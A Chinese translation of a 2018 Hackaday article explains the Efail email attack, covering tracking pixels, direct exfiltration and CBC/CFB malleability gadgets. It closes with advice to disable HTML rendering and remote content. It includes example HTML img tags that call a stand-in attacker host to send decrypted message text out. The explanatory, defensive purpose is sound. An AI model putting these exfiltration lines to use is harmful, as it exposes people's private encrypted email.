# 解释电子邮件以及为什么它不是电子邮件隐私的终结

> 原文：<https://hackaday.com/2018/05/21/explaining-efail-and-why-it-isnt-the-end-of-email-privacy/>

上周 PGPocalipse 是所有的新闻…除了，嗯，这不是一个启示。

一组研究人员发表了一篇论文，描述了如何通过有针对性的攻击来解密 PGP 加密的电子邮件。这项研究本身有很好的文档记录，从安全研究人员的角度来看，这是一篇值得一读的论文，尤其是密码学部分。

但是我们在 [Hackaday 对媒体声称的 Efail 破坏了 PGP 表示怀疑。一些媒体报道甚至建议所有人关闭所有电子邮件客户端的 PGP 加密。，但他们无法用坚定的理由来支持这一建议。事实上，Efail 对绝大多数人来说并不是一个直接的威胁，因为攻击者**必须已经拥有加密电子邮件**才能利用这个漏洞。建议所有人一起禁用加密是没有意义的。](https://hackaday.com/2018/05/14/pgp-vulnerability-pre-announced-by-security-researcher/)

除了大量的假警报，Efail 是一个非常有趣的利用来包装你的脑袋。休息之后，请加入我，我将介绍它是如何工作的，以及您可以做些什么来避免它。

## Efail 不直接利用 PGP

简单来说，如果攻击者能够访问用户的加密电子邮件，他们可以以特定的方式修改邮件，然后将其发送回用户。用户的电子邮件客户端将解密消息，并且(如果电子邮件客户端正在呈现 HTML 标签)自动将解密的消息发送回攻击者。

加密本身没有被破解。正是用户的电子邮件客户端处理邮件的方式引入了漏洞。说 PGP 坏了是完全错误的——但是我们认为它产生了大量的点击。

从电子邮件中提取数据的能力是一个古老的话题。当电子邮件客户端开始增加呈现 HTML 的能力时，就引入了许多安全问题。过去，一些电子邮件客户端甚至将电子邮件内容视为网页，甚至渲染 Javascript。会出什么问题呢？…

## 故事时间:追踪像素

广告业用来追踪网站用户的一种常用技术也适用于 HTML 电子邮件:追踪像素。跟踪像素是一种网络信标，以微小图像的形式包含在网页或电子邮件中，导致软件客户端向另一台服务器发出请求。通过这些请求，服务器通常可以识别请求计算机的 IP 地址、请求内容的时间、发出请求的 web 浏览器的类型以及该服务器先前设置的 cookies 的存在。在电子邮件中，还可以知道用户是否将该电子邮件转发给了另一个用户，因为广告公司发送的带有跟踪像素的每封电子邮件对于每个用户都有唯一的代码。

实现跟踪像素就像在 HTML 电子邮件中添加图像标签一样简单。假设一封电子邮件包含以下标签:

```
<img src="http://attacker.domain.xyz/image-12345678.png" height="1" width="1">

```

当电子邮件客户端试图呈现 HTML 时，它试图从位于*攻击者.域. xyz* 的网络服务器加载文件 *'/image-12345678.png'* ，以便显示它。攻击者控制的 web 服务器记录该请求。如果您曾经查看过 web 服务器日志文件，这看起来会很熟悉:

```
11.22.33.44 - - [17/May/2018:00:25:18 +0100] "GET /image-12345678.png HTTP/1.1" 200 702 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"

```

在上面的日志条目中，web 服务器(本例中为 Apache)记录了发出请求的浏览器使用的 IP 地址*11.22.33.44*和被请求的文件*image-12345678.png。*在这个简化的例子中，唯一的 ID 是 12345678 零件。还有关于浏览器本身的信息和其他信息，如 cookies，可以被存储，尽管默认情况下不会显示在日志条目中。简单的跟踪像素基本上是一个带有唯一 ID 的自定义文件名。

## Efail 建立在跟踪像素的概念上

Efail 使用这种远程图像加载作为反向通道来解密电子邮件。其他方法也是可能的。Efail 利用了电子邮件的优势，客户端首先必须解密一个加密的消息以便显示它，然后它在消息中呈现 HTML 代码。

Efail 论文描述了解密数据的两种主要渗透方法，一种是直接渗透方法，另一种是使用作者称之为延展性小工具的通用渗透方法。我将试着解释这两者，但不会深入挖掘编码、内容类型等肮脏的细节。

## 直接渗出

假设攻击者可以访问加密的电子邮件消息:“这是一条秘密消息”。他们不知道内容是什么，因为它是加密的，看起来像这样:`TmV2ZXIgZ29ubmEgZ2l2ZSB5b3UgdXAKTmV2ZXIgZ29ubmEgbGV0IHlvdSBkb3duCg==`。攻击者获取这些加密的数据并生成以下电子邮件:

```
Hi this is Jennifer, check out my latest picture: <img src="http://attacker.domain.xyz/TmV2ZXIgZ29ubmEgZ2l2ZSB5b3UgdXAKTmV2ZXIgZ29ubmEgbGV0IHlvdSBkb3duCg==">

```

我们知道，当攻击者控制的服务器试图从服务器加载映像时，它会从请求中收到文件名和有关客户端的详细信息。但是 Efail 团队发现，当电子邮件客户端检测到加密块时，它会在呈现 HTML 之前解密数据。所以当邮件客户端显示这封邮件时，它会立即解密编码块。实际上，呈现前的 HTML 代码将如下所示:

```
Hi this is Jennifer, check out my latest picture: <img src="http://attacker.domain.xyz/This is a secret message">

```

当电子邮件客户端开始最终呈现电子邮件时，它将尝试从攻击者控制的 web 服务器加载位于`/This is a secret message`的图像，该服务器将接收解密的数据作为文件名。

瞧啊。攻击者可以很容易地创建一个简单的脚本，该脚本将根据请求返回图像数据，因此用户将在客户端实际看到一个图像，而攻击者将看到解密的信息。

## 延展性小工具

我们已经看到实现一个直接的渗透通道来解密电子邮件是多么简单。在一些电子邮件客户端中，这种技术不起作用，因此 Efail 论文描述了一种更通用的方法，在实际加密的数据本身中引入渗透通道。

一般来说，不弄乱加密数据是不可能的。前面的电子邮件示例过于简化。电子邮件在发送前几乎都使用 MIME 标准进行编码。研究人员展示了如何利用 CBC 和 CFB 中使用的分组密码操作模式的一些特性，在 S/MIME(MIME 数据的公钥加密和签名标准)和 OpenPGP(与 S/MIME 不同的编码，但功能相似)加密的电子邮件中引入延展性小工具。

简而言之，当使用这些操作模式对消息进行加密时，如果攻击者在加密之前知道单个明文块，他们就有可能将该单个数据块更改为他们选择的有效加密文本。由于 S/MIME 和 OpenPGP 编码的消息在解密后通常以相同的明文开始，这给了攻击者一个引入可延展性小工具的立足点。例如，当电子邮件用 S/MIME 编码(先签名后加密)时，电子邮件通常以“内容类型:多部分/已签名”开头。这封邮件加密后，攻击者知道密文的第一个字节就是那个字符串，所以攻击者知道受害者邮件的这个明文块和对应的密文，这就是引入延展性小工具所需要的。

攻击者可以将这个初始报头更改为他们喜欢的有效密文，这可以是类似于直接渗透方法的类似于`<img src="http://attacker.domain.com/`的内容。酷的部分是，电子邮件客户端将收到一封完全加密的邮件，使其更难检测到攻击。只有在解密之后和呈现之前，攻击才会变得明显。

这在实际工作中有几个挑战。如果你对密码学感兴趣，推荐阅读这篇文章。

## 结论

上面的例子是简化的，不能开箱即用，但是试图解释所发现的 Efail 漏洞的整体机制。我希望读者意识到两件事:电子邮件的加密仍然是普遍安全的，在电子邮件中呈现 HTML 仍然不是一个好主意。

为了保护自己免受这一漏洞以及许多其他漏洞的攻击，请禁用电子邮件客户端中的 HTML 呈现。许多电子邮件客户端允许这一点，并且/或者具有禁止加载远程内容的设置。这可能足以阻止 Efail，至少可以阻止使用 *img* 标签作为反向通道的攻击。如果您使用 PGP，而您的电子邮件客户端不支持这些设置，请考虑更换为更安全的客户端。

我的主要建议是现在就禁用 HTML 渲染，即使你不使用 PGP。至少这样跟踪你的公司会少很多。